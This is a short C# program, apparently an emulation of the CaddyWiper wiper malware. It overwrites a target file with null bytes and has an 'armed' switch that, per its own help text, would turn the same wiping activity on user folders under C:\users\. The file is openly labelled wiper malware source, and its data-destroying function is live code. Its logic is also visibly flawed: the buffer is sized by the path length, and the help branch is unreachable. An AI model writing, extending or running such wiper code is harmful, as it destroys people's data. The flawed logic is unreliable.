using System.Reflection.Metadata;

namespace emu
{
    public class caddycore
    {
        
        static void wipe(string Filepath)
        {
            Console.WriteLine(Filepath);
            byte[] byteray = nullwrite(Filepath.Length);
            File.WriteAllBytes(Filepath, byteray);
            /*using (Stream stream = File.Open(Filepath, FileMode.Open))
            {
                stream.Position = 0;
                stream.Write(null);
            }*/
        }

        static byte[] nullwrite(int Size)
        {
            byte[] nullbytes = new byte[Size];
            return nullbytes;
        }

        static void Main(string[] args)
        {
            //string filepath = "C:\\users\\zoe\\Desktop\\test.txt";
            //wipe(filepath);
            int armed = 0;
            if (armed == 1)
            {
                DirectoryInfo directoryinfo = new DirectoryInfo("C:\\users\\");
                foreach (FileInfo file in directoryinfo.GetFiles())
                {
                    Console.WriteLine(file.FullName);
                }
            }
            else if (armed == 0 && args[0].Length > 0)
            {
                Console.WriteLine("not armed, proceeding with caged execution" );
                if (File.Exists(args[0])) 
                {
                    wipe(args[0]);
                }
            }
            else if (args[0] == "-h" || args[0] == "-help" || args[0] == "/help")
            {
                Console.WriteLine("Usage: run the executable with the path to a target file. This will turn the contents of the file to null bytes.");
                Console.WriteLine("if armed == 1, this wiper malware *WILL* attempt to perform CaddyWiper's activity in `C:\\users\\`. PLEASE USE WITH CAUTION");
            }
            else
            {
                Console.WriteLine("ERROR:");
            }
        }
    }
}